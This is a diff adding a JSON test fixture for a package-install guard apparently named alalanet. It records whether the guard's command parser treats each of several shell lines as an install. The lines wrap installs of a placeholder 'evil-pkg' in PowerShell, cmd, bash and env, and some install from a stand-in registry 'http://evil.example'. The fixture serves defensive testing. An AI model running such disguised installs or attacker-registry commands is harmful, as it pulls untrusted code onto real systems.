@@ -1,0 +1,159 @@
+{
+ "about": "Lines (the review's round-4 lines: PowerShell positional, cmd glued, bash valued options, argv joins) and whether alalanet's install reader acts on them (installread.ParseLine + HookExtra at alalanetd 32524701), from the review differential of 2026-11-22. Every line it acts on must be sent.",
+ "lines": [
+  {
+   "line": "powershell npm i evil-pkg",
+   "acts": false,
+   "targets": null,
+   "unread": null
+  },
+  {
+   "line": "powershell -NoProfile npm i evil-pkg",
+   "acts": false,
+   "targets": null,
+   "unread": null
+  },
+  {
+   "line": "pwsh npm i evil-pkg",
+   "acts": false,
+   "targets": null,
+   "unread": null
+  },
+  {
+   "line": "pwsh -co 'npm i evil-pkg'",
+   "acts": false,
+   "targets": null,
+   "unread": null
+  },
+  {
+   "line": "pwsh -cwa 'npm i evil-pkg'",
+   "acts": false,
+   "targets": null,
+   "unread": null
+  },
+  {
+   "line": "pwsh -CommandWithArgs 'npm i evil-pkg'",
+   "acts": false,
+   "targets": null,
+   "unread": null
+  },
+  {
+   "line": "pwsh -File install.ps1",
+   "acts": false,
+   "targets": null,
+   "unread": null
+  },
+  {
+   "line": "cmd /cnpm i evil-pkg",
+   "acts": false,
+   "targets": null,
+   "unread": null
+  },
+  {
+   "line": "cmd /C\"npm i evil-pkg\"",
+   "acts": false,
+   "targets": null,
+   "unread": null
+  },
+  {
+   "line": "bash --rcfile x -c 'npm i evil-pkg'",
+   "acts": true,
+   "targets": [
+    "npm:evil-pkg"
+   ],
+   "unread": [
+    "defines an alias or a function on a line that installs, which can change what the install runs (bash --rcfile)"
+   ]
+  },
+  {
+   "line": "bash -o pipefail -lc 'npm i evil-pkg'",
+   "acts": true,
+   "targets": [
+    "npm:evil-pkg"
+   ],
+   "unread": null
+  },
+  {
+   "line": "git commit -m x && npm i evil-pkg",
+   "acts": true,
+   "targets": [
+    "npm:evil-pkg"
+   ],
+   "unread": null
+  },
+  {
+   "line": "git commit -m 'x && npm i evil-pkg'",
+   "acts": false,
+   "targets": null,
+   "unread": null
+  },
+  {
+   "line": "echo 'npm i evil-pkg'",
+   "acts": false,
+   "targets": null,
+   "unread": null
+  },
+  {
+   "line": "echo npm i evil-pkg",
+   "acts": false,
+   "targets": null,
+   "unread": null
+  },
+  {
+   "line": "env npm i evil-pkg",
+   "acts": true,
+   "targets": [
+    "npm:evil-pkg"
+   ],
+   "unread": null
+  },
+  {
+   "line": "'env' 'npm' 'i' 'evil-pkg'",
+   "acts": true,
+   "targets": [
+    "npm:evil-pkg"
+   ],
+   "unread": null
+  },
+  {
+   "line": "npm install 'evil-pkg' '--registry=http://evil.example'",
+   "acts": true,
+   "targets": [
+    "npm:evil-pkg"
+   ],
+   "unread": [
+    "installs from a custom registry or index (evil.example): alalanet judges packages on the public registries only"
+   ]
+  },
+  {
+   "line": "npm install evil-pkg --registry=http://evil.example",
+   "acts": true,
+   "targets": [
+    "npm:evil-pkg"
+   ],
+   "unread": [
+    "installs from a custom registry or index (evil.example): alalanet judges packages on the public registries only"
+   ]
+  },
+  {
+   "line": "hello, please install it",
+   "acts": false,
+   "targets": null,
+   "unread": null
+  },
+  {
+   "line": "npm i evil-pkg\n",
+   "acts": true,
+   "targets": [
+    "npm:evil-pkg"
+   ],
+   "unread": null
+  },
+  {
+   "line": "y\n",
+   "acts": false,
+   "targets": null,
+   "unread": null
+  }
+ ]
+}
